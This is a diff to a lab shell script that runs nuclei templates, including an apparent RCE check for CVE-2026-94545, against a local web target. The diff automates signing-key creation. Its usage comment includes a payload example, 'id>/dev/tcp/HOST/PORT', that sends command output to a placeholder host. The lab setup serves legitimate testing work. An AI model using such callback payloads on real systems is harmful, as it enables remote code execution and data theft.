@@ -14,6 +14,8 @@
 #   ./run-nuclei.sh http://127.0.0.1:3000 --no-rce
 #   ./run-nuclei.sh http://127.0.0.1:3000 --oast 127.0.0.1:4444
 #   ./run-nuclei.sh http://127.0.0.1:3000 --cmd 'bash -c "id>/dev/tcp/HOST/PORT"'
+#   ./run-nuclei.sh ... --no-keygen                 # do not create a keypair
+#   ./run-nuclei.sh ... --keys-dir /path/to/keys    # use a specific keypair
 set -uo pipefail
 
 LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -22,15 +24,18 @@ SIGNED_DIR="$LAB_DIR/.signed"
 
 TARGET="http://127.0.0.1:3000"
 RUN_RCE=1
+KEYGEN=1
 CMD=""
 OAST=""
 
 while [ $# -gt 0 ]; do
   case "$1" in
-    --no-rce) RUN_RCE=0; shift ;;
+    --no-rce)     RUN_RCE=0; shift ;;
+    --no-keygen)  KEYGEN=0; shift ;;
+    --keys-dir)   KEYS_DIR="${2:?--keys-dir needs a path}"; shift 2 ;;
     --cmd)    CMD="${2:-}"; shift 2 ;;
     --oast)   OAST="${2:-}"; shift 2 ;;
-    -h|--help) sed -n '2,22p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; exit 0 ;;
+    -h|--help) sed -n '2,60p' "${BASH_SOURCE[0]}" | sed '/^[^#]/,$d' | sed 's/^# \{0,1\}//'; exit 0 ;;
     *) TARGET="$1"; shift ;;
   esac
 done
@@ -49,13 +54,12 @@ status="$(curl -s -o /dev/null -m 8 -w '%{http_code}' "$TARGET/api/og?value=nucl
 log "target $TARGET answers (HTTP $status on /api/og)"
 
 # -------------------------------------------------------------------- keypair
-# Signing needs a keypair, and nuclei can only create one interactively: it asks
-# for a user/organization name and then twice for a passphrase (hidden input).
-# A mismatch is fatal and saves nothing, and there is no flag to skip the prompts
-# (the noUserPassphrase switch is only used by nuclei's own tests). So this script
-# does not pretend to automate it - it checks for the keys and prints the exact
-# command and the exact answers when they are missing.
-KEYS_DIR="${XDG_CONFIG_HOME:-$HOME/.config}/nuclei/keys"
+# nuclei refuses to run unsigned javascript: templates, and its own key
+# generation is interactive-only (name + passphrase twice, hidden input; a
+# mismatch is fatal and writes nothing). make-signing-keys.sh produces the exact
+# pair the signer reads - SEC1 EC private key + self-signed x509 cert - so no
+# prompt is ever shown.
+KEYS_DIR="${KEYS_DIR:-${NUCLEI_KEYS_DIR:-${XDG_CONFIG_HOME:-$HOME/.config}/nuclei/keys}}"
 CERT_FILE="$KEYS_DIR/nuclei-user.crt"
 KEY_FILE="$KEYS_DIR/nuclei-user-private-key.pem"
 
@@ -66,28 +70,13 @@ elif [ -f "$CERT_FILE" ] && [ -f "$KEY_FILE" ]; then
   if grep -qE 'ENCRYPTED|Proc-Type: 4,ENCRYPTED' "$KEY_FILE" 2>/dev/null; then
     log "note: the private key is passphrase-protected - nuclei will ask for it while signing"
   fi
+elif [ "$KEYGEN" = "1" ]; then
+  log "no signing keypair in $KEYS_DIR - creating one (no prompts)"
+  "$LAB_DIR/make-signing-keys.sh" --dir "$KEYS_DIR" >/dev/null ||
+    die "could not create a signing keypair; run $LAB_DIR/make-signing-keys.sh by hand"
+  log "keypair ready"
 else
-  cat >&2 <<EOF
-${c_red}[nuclei-run]${c_off} no signing keypair found in $KEYS_DIR
-
-nuclei refuses to run unsigned javascript: templates, so the keypair must exist
-first. Create it once, interactively:
-
-    nuclei -sign -t $TEMPLATE_DIR/CVE-2026-94545.yaml
-
-Answer the prompts (input is hidden, it is not echoed):
-    [*] Enter User/Organization Name (exit to abort) :   any name, e.g. hax0r
-    [*] Enter passphrase (exit to abort):                press Enter twice for
-    [*] Enter same passphrase again:                     no passphrase, or type
-                                                         the same one twice
-
-"passphrase did not match try again" means the two entries differed - easy when
-nothing is echoed - and nothing was saved, so just run it again. An empty
-passphrase is allowed and then you are never asked for it again.
-
-Then re-run:  $0 $TARGET
-EOF
-  exit 1
+  die "no signing keypair in $KEYS_DIR and --no-keygen was given"
 fi
 
 # ----------------------------------------------------------------- sign copies
